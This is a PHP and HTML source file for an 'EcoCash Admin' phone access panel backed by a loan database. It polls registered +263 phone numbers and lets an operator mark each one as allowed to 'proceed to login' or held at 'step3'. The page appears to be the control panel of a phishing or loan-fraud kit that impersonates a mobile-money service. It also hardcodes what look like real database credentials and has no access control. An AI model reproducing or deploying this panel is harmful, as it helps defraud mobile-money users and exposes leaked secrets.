<?php
// ========== BACKEND HANDLER - MUST BE AT THE VERY TOP ==========
session_start();

// Database configuration
$dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
$dbPort = 5432;
$dbName = "loan_9d8q";
$dbUser = "loan_9d8q_user";
$dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";

function getDbConnection($host, $port, $dbname, $user, $pass) {
    $connString = "host=$host port=$port dbname=$dbname user=$user password=$pass";
    $conn = @pg_connect($connString);
    return $conn;
}

$conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);

// Handle POST requests (AJAX updates)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest') {
    header('Content-Type: application/json');
    
    $phone = $_POST['phone'] ?? '';
    $action = $_POST['action'] ?? '';
    
    if (!$phone || !$action) {
        echo json_encode(['success' => false, 'error' => 'Missing phone or action']);
        exit;
    }
    
    // Set allow value: 1 for allow, 0 for disallow
    $allowValue = ($action === 'allow') ? 1 : 0;
    
    // Update the allow column for this phone
    $updateSQL = "UPDATE users SET allow = $1 WHERE phone = $2";
    $result = pg_query_params($conn, $updateSQL, [$allowValue, $phone]);
    
    if ($result) {
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false, 'error' => pg_last_error($conn)]);
    }
    exit;
}

// Handle GET requests for data fetch
if (isset($_GET['fetch_data']) && $_GET['fetch_data'] == 1) {
    header('Content-Type: application/json');
    
    // Check if created_at column exists, if not, we'll use phone as fallback
    $checkColumn = pg_query($conn, "SELECT column_name FROM information_schema.columns WHERE table_name='users' AND column_name='created_at'");
    $hasCreatedAt = (pg_num_rows($checkColumn) > 0);
    
    if ($hasCreatedAt) {
        // Order by created_at DESC (newest first)
        $query = "SELECT phone, COALESCE(allow, 0) as allow_status, created_at FROM users ORDER BY created_at DESC";
    } else {
        // Fallback: order by phone DESC (assuming newer numbers are higher)
        $query = "SELECT phone, COALESCE(allow, 0) as allow_status FROM users ORDER BY phone DESC";
    }
    
    $result = pg_query($conn, $query);
    
    $users = [];
    if ($result) {
        while ($row = pg_fetch_assoc($result)) {
            $users[] = [
                'phone' => $row['phone'],
                'allow_status' => (int)$row['allow_status']
            ];
        }
    }
    
    echo json_encode($users);
    exit;
}

// Add created_at column if it doesn't exist (for better ordering)
$checkColumn = pg_query($conn, "SELECT column_name FROM information_schema.columns WHERE table_name='users' AND column_name='created_at'");
if (pg_num_rows($checkColumn) == 0) {
    pg_query($conn, "ALTER TABLE users ADD COLUMN created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP");
    error_log("Added created_at column to users table");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>EcoCash Admin | Phone Access Controller</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
            background: #eef2f7;
            padding: 20px;
            min-height: 100vh;
        }

        .dashboard-container {
            max-width: 1280px;
            margin: 0 auto;
        }

        /* header card */
        .admin-header {
            background: linear-gradient(135deg, #0b2b44 0%, #0a3b5c 100%);
            border-radius: 28px;
            padding: 20px 28px;
            margin-bottom: 24px;
            box-shadow: 0 10px 20px rgba(0,0,0,0.08);
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            align-items: center;
            gap: 16px;
        }

        .title-section h1 {
            color: white;
            font-size: 1.7rem;
            font-weight: 600;
            letter-spacing: -0.3px;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .title-section h1 span {
            background: rgba(255,255,255,0.2);
            font-size: 0.8rem;
            padding: 4px 12px;
            border-radius: 40px;
            font-weight: 400;
        }

        .stats-badge {
            background: rgba(255,255,255,0.15);
            backdrop-filter: blur(4px);
            padding: 8px 18px;
            border-radius: 60px;
            color: white;
            font-weight: 500;
            font-size: 0.9rem;
        }

        .stats-badge i {
            font-weight: 600;
            margin-right: 6px;
        }

        /* main card */
        .data-card {
            background: white;
            border-radius: 28px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.05);
            overflow: hidden;
            transition: all 0.2s;
        }

        .toolbar {
            padding: 18px 24px;
            background: #f9fafc;
            border-bottom: 1px solid #e9edf2;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 14px;
        }

        .refresh-badge {
            background: #eef2ff;
            color: #1e40af;
            padding: 6px 14px;
            border-radius: 50px;
            font-size: 0.75rem;
            font-weight: 500;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .live-indicator {
            width: 10px;
            height: 10px;
            background: #10b981;
            border-radius: 10px;
            display: inline-block;
            box-shadow: 0 0 0 0 rgba(16,185,129,0.5);
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { opacity: 0.6; transform: scale(0.9);}
            100% { opacity: 1; transform: scale(1.2);}
        }

        .table-wrapper {
            overflow-x: auto;
            padding: 0;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.9rem;
        }

        th {
            text-align: left;
            padding: 18px 16px;
            background-color: #ffffff;
            color: #1f2a44;
            font-weight: 600;
            border-bottom: 1px solid #e2e8f0;
            font-size: 0.85rem;
            letter-spacing: 0.3px;
        }

        td {
            padding: 16px;
            border-bottom: 1px solid #f0f2f5;
            vertical-align: middle;
        }

        tr:hover td {
            background-color: #fafcff;
        }

        .rank-number {
            font-weight: 700;
            color: #4f46e5;
            font-size: 1rem;
            width: 60px;
            text-align: center;
        }

        .phone-cell {
            font-weight: 600;
            color: #0c4e6e;
            font-family: monospace;
            font-size: 0.95rem;
            letter-spacing: 0.2px;
        }

        .action-buttons {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
        }

        .btn-allow {
            background: #10b981;
            border: none;
            padding: 8px 20px;
            border-radius: 40px;
            font-weight: 600;
            font-size: 0.8rem;
            color: white;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }

        .btn-allow:hover {
            background: #059669;
            transform: translateY(-1px);
            box-shadow: 0 4px 10px rgba(16,185,129,0.3);
        }

        .btn-disallow {
            background: #ef4444;
            border: none;
            padding: 8px 20px;
            border-radius: 40px;
            font-weight: 600;
            font-size: 0.8rem;
            color: white;
            cursor: pointer;
            transition: 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }

        .btn-disallow:hover {
            background: #dc2626;
            transform: translateY(-1px);
            box-shadow: 0 4px 10px rgba(239,68,68,0.3);
        }

        .status-badge {
            display: inline-block;
            padding: 5px 12px;
            border-radius: 40px;
            font-size: 0.7rem;
            font-weight: 600;
            text-align: center;
            min-width: 90px;
        }

        .status-allowed {
            background: #d1fae5;
            color: #065f46;
        }

        .status-disallowed {
            background: #fee2e2;
            color: #991b1b;
        }

        .status-default {
            background: #f1f5f9;
            color: #334155;
        }

        .empty-row td {
            text-align: center;
            padding: 48px;
            color: #6c757d;
            font-style: italic;
        }

        footer {
            background: #f9fafb;
            padding: 16px 24px;
            border-top: 1px solid #edf2f7;
            font-size: 0.7rem;
            color: #5b6e8c;
            text-align: center;
        }

        .new-badge {
            background: #ef4444;
            color: white;
            font-size: 0.65rem;
            padding: 2px 8px;
            border-radius: 20px;
            margin-left: 8px;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }

        @media (max-width: 700px) {
            body {
                padding: 12px;
            }
            .admin-header {
                padding: 16px;
            }
            .title-section h1 {
                font-size: 1.3rem;
            }
            td, th {
                padding: 12px 10px;
            }
            .action-buttons {
                gap: 8px;
            }
            .btn-allow, .btn-disallow {
                padding: 6px 14px;
                font-size: 0.7rem;
            }
            .rank-number {
                font-size: 0.85rem;
                width: 45px;
            }
        }
    </style>
</head>
<body>
<div class="dashboard-container">
    <div class="admin-header">
        <div class="title-section">
            <h1>📞 Phone Access Manager <span>Allow / Disallow</span></h1>
            <div style="color: #b9d9f0; font-size: 0.8rem; margin-top: 6px;">Newest registrations at the top (highest number)</div>
        </div>
        <div class="stats-badge">
            <i>👥</i> <span id="totalPhonesCount">0</span> registered numbers
        </div>
    </div>

    <div class="data-card">
        <div class="toolbar">
            <div class="refresh-badge">
                <span class="live-indicator"></span> Live sync · 5s refresh
            </div>
            <div style="font-size: 0.75rem; color: #4a5b7a;">
                🟢 Allow = 1 (Can proceed to login) &nbsp;&nbsp;|&nbsp;&nbsp; 🔴 Disallow = 0 (Stay at step3)
            </div>
        </div>
        <div class="table-wrapper">
            <table id="phoneTable">
                <thead>
                    <tr><th style="text-align: center;">#</th><th>Phone Number</th><th>Access Status</th><th>Action</th></tr>
                </thead>
                <tbody id="tableBody">
                    <tr class="empty-row"><td colspan="4">Loading phone records...</td></tr>
                </tbody>
            92
        </div>
        <footer>
            ⚡ <strong>Numbers count down from highest (newest) to lowest (oldest)</strong><br>
            🔁 "Allow" sets allow = 1 (user can proceed to login). "Disallow" sets allow = 0 (user stays on step3). Default = 0.<br>
            📞 All phone numbers are displayed with +263 prefix (no spaces)
        </footer>
    </div>
</div>

<div id="toastMsg" style="position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%); background: #1f2937; color: white; padding: 10px 20px; border-radius: 50px; font-size: 0.8rem; z-index: 1100; opacity: 0; transition: opacity 0.2s; pointer-events: none;"></div>

<script>
    let currentRecords = [];
    let lastCount = 0;

    function showToast(msg, isError = false) {
        const toast = document.getElementById('toastMsg');
        toast.textContent = msg;
        toast.style.backgroundColor = isError ? '#b91c1c' : '#0f3b2c';
        toast.style.opacity = '1';
        setTimeout(() => {
            toast.style.opacity = '0';
        }, 2500);
    }

    // Function to format phone number with +263 prefix (no spaces)
    function formatPhoneNumber(phone) {
        // Remove any existing + or country code
        let cleanPhone = phone.toString().replace(/^\+?263/, '');
        // Remove any non-digit characters
        cleanPhone = cleanPhone.replace(/\D/g, '');
        
        // Ensure it's 9 digits (Zimbabwe mobile numbers are 9 digits after 263)
        if (cleanPhone.length === 9) {
            return `+263${cleanPhone}`;
        } else if (cleanPhone.length === 10 && cleanPhone.startsWith('0')) {
            // If it starts with 0 (like 0712345678), remove the 0
            return `+263${cleanPhone.substring(1)}`;
        } else if (cleanPhone.length === 12 && cleanPhone.startsWith('263')) {
            return `+${cleanPhone}`;
        } else {
            // Return as is with +263 prefix if it doesn't have it
            if (!phone.toString().startsWith('+263')) {
                return `+263${cleanPhone}`;
            }
            // Remove any spaces if present
            return phone.toString().replace(/\s/g, '');
        }
    }

    function renderPhoneTable(records) {
        const tbody = document.getElementById('tableBody');
        if (!records || records.length === 0) {
            tbody.innerHTML = '<tr class="empty-row"><td colspan="4">📭 No phone numbers found in database</td></tr>';
            document.getElementById('totalPhonesCount').innerText = '0';
            lastCount = 0;
            return;
        }
        
        document.getElementById('totalPhonesCount').innerText = records.length;
        let html = '';
        
        // Display with counting DOWN from total to 1 (newest = highest number)
        const total = records.length;
        records.forEach((record, idx) => {
            // This makes newest record show number = total, oldest show number = 1
            const rank = total - idx;
            const phoneRaw = record.phone;
            // Format phone number with +263 prefix (no spaces)
            const displayPhone = formatPhoneNumber(phoneRaw);
            
            const allowValue = record.allow_status;
            
            let statusText = '';
            let statusClass = '';
            if (allowValue === 1) {
                statusText = '✅ Allowed (1)';
                statusClass = 'status-allowed';
            } else {
                statusText = '⏳ Waiting (0)';
                statusClass = 'status-disallowed';
            }
            
            // Add "NEW" badge for the top 3 newest entries (highest numbers)
            const isNew = idx < 3;
            const newBadge = isNew ? '<span class="new-badge">NEW</span>' : '';
            
            html += `
                <tr data-phone="${escapeHtml(phoneRaw)}" data-allow="${allowValue}">
                    <td class="rank-number" style="text-align: center; font-weight: bold; font-size: 1.1rem;">${rank}${newBadge}</td>
                    <td class="phone-cell">📞 ${escapeHtml(displayPhone)}</td>
                    <td><span class="status-badge ${statusClass}">${statusText}</span></td>
                    <td class="action-buttons">
                        <button class="btn-allow" data-phone="${escapeHtml(phoneRaw)}">👍 Allow (1)</button>
                        <button class="btn-disallow" data-phone="${escapeHtml(phoneRaw)}">👎 Disallow (0)</button>
                    </td>
                </tr>
            `;
        });
        tbody.innerHTML = html;
        
        // Check for new records
        if (records.length !== lastCount && lastCount !== 0) {
            if (records.length > lastCount) {
                showToast(`✨ New application received! Total: ${records.length}`, false);
            }
        }
        lastCount = records.length;
        
        document.querySelectorAll('.btn-allow').forEach(btn => {
            btn.addEventListener('click', (e) => {
                e.stopPropagation();
                const phone = btn.getAttribute('data-phone');
                handleUpdate(phone, 'allow');
            });
        });
        
        document.querySelectorAll('.btn-disallow').forEach(btn => {
            btn.addEventListener('click', (e) => {
                e.stopPropagation();
                const phone = btn.getAttribute('data-phone');
                handleUpdate(phone, 'disallow');
            });
        });
    }
    
    async function handleUpdate(phone, action) {
        const formData = new FormData();
        formData.append('phone', phone);
        formData.append('action', action);
        
        try {
            const response = await fetch(window.location.href, {
                method: 'POST',
                headers: {
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: formData
            });
            const result = await response.json();
            if (result.success) {
                const formattedPhone = formatPhoneNumber(phone);
                const msg = action === 'allow' ? `✅ ${formattedPhone} → Allowed (1)` : `⏳ ${formattedPhone} → Disallowed/Waiting (0)`;
                showToast(msg);
                await fetchPhoneData();
            } else {
                showToast(`Update failed: ${result.error || 'server error'}`, true);
            }
        } catch (err) {
            console.error(err);
            showToast('Network error — please try again', true);
        }
    }
    
    async function fetchPhoneData() {
        try {
            const res = await fetch(`${window.location.href}?fetch_data=1&t=${Date.now()}`);
            if (!res.ok) throw new Error('HTTP error');
            const data = await res.json();
            currentRecords = data;
            renderPhoneTable(currentRecords);
        } catch (err) {
            console.error('Fetch error:', err);
            const tbody = document.getElementById('tableBody');
            tbody.innerHTML = '<tr class="empty-row"><td colspan="4">⚠️ Failed to load data. Check connection.</td></tr>';
            showToast('Cannot fetch phone list', true);
        }
    }
    
    function escapeHtml(str) {
        if (!str) return '';
        return str.replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }
    
    // Initial load
    fetchPhoneData();
    // Refresh every 5 seconds
    const intervalId = setInterval(fetchPhoneData, 5000);
    
    window.addEventListener('beforeunload', () => {
        if (intervalId) clearInterval(intervalId);
    });
</script>
</body>
</html>
